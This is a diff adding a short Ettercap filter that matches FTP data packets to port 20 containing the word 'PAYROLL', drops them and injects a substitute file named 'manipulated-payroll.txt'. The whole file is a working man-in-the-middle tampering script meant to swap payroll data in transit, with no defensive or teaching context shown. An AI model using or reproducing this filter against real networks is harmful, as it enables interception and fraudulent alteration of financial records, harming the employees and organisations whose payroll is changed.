@@ -1,0 +1,12 @@
+##
+#
+#  Ettercap filter to maniuplate a txt which is uploaded to a FTP Server
+#
+##
+
+if (ip.proto == TCP && tcp.dst == 20 && search(DATA.data, "PAYROLL")) {
+    drop();
+    inject("./manipulated-payroll.txt");
+    msg("Manipulated packet!");
+}
+
